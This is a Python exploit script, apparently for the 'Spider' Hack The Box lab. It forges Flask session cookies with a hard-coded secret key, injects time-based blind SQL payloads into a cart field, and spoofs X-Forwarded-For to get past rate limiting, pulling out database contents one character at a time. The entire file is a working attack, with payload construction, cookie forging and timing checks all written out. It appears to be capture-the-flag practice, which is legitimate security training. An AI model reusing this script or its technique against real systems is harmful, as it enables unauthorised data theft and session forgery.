#!/usr/bin/python3

import os, subprocess, signal, argparse
import requests, time, string
from pwn import *

class BienMal:
    DONE = "✔"
    FAIL = "✘"

def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument('-d', dest='database', default='shop', type=str, help='Name of database associed to table, default: shop')
    parse.add_argument('-t', dest='table', default='users', type=str, help='Name of table assoccied to column, default: users')
    parse.add_argument('-c', dest='column', default='name', type=str, help='Column to dump, default: name')
    return parse.parse_args()

# ¬ CTRL+C
terminate = False
def def_handler(sig, frame):
    global terminate
    terminate = True
    print("\nsaLi3nDO...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

args = arguments(); 
# ¬ Variables
url = "http://spider.htb"
uuid_user = "fd0b0386-ba0c-4b54-9ad2-115522b90729"
secret_key = "Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942"
# abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~£
dic_letters = string.ascii_letters + string.digits + string.punctuation + "£"
#dic_letters = "-" + string.hexdigits + "£"
db_name = args.database
table_name = args.table
column_name = args.column

session = requests.Session()

print("[*] Extrayendo columna '%s' de la tabla '%s' en la base de datos '%s'" % (column_name, table_name, db_name))
p1 = log.progress("Payload")
print()

# Simulamos que existen 10 filas
for row in range(0,10):
    if terminate: break  # Evitamos que imprima los demás log.progress
    p2 = log.progress("%s [%s]" % (column_name, row))
    result = ""
    # Simulamos que cada fila tiene 50 caracteres en su nombre
    for row_position in range(1,50):
        for letter in dic_letters:
            if terminate: break
            
            payload = "1 or IF(Ascii(substring((SELECT %s FROM %s.%s LIMIT %d,1),%d,1))=%d,sleep(0.6),1)#" % (column_name, db_name, table_name, row, row_position, ord(letter))
            p1.status(payload)

            json_payload = '{"cart_items": ["%s"],"uuid": "%s"}' % (payload, uuid_user)
            try:
                # ¬ Generamos token sin firmar con la herramienta flask-unsign
                session_token = subprocess.check_output("flask-unsign --sign --cookie '%s' --secret '%s' 2>/dev/null" % (json_payload, secret_key), shell=True, stderr=subprocess.STDOUT)
                # ¬ Damos formato al header, bypasseamos x-rate-limit y enviamos la nueva cookie
                headers = {
                    "X-Forwarded-For": "127.0.0.1",
                    "Cookie" : "session=" + session_token.decode('utf-8').strip('\n')
                }
                # ¬ Intentamos visitar /cart con la nueva cookie, si la respuesta demora más de 3 segundos sabemos que nuestra letra genera una inyección SQL
                time_before = time.time()
                r = session.get(url + '/cart', headers=headers)
                time_after = time.time()

                # A veces la web como que muere y hace que las siguientes letras (que deberian funcionar) no funcionen y pase a la siguiente base de datos con la actual incompleta
                # Tonces le damos unos milisegundos a ver si se estabiliza.
                time.sleep(0.2) 

                if time_after - time_before > 3: 
                    result += letter
                    p2.status(result)
                    break

            except Exception as e:
                if "returned non-zero exit status 127" in str(e):
                    print("\n[" + BienMal.FAIL + "] Instala 'flask-unsign': pip install flask-unsign\n")
                    exit(1)
                pass

        if letter == "£":  # Evitamos que siga iterando una tabla a la que ya le descubrio su nombre
            p2.success(result)
            break

payload = "d0NEe"
p1.success(payload)
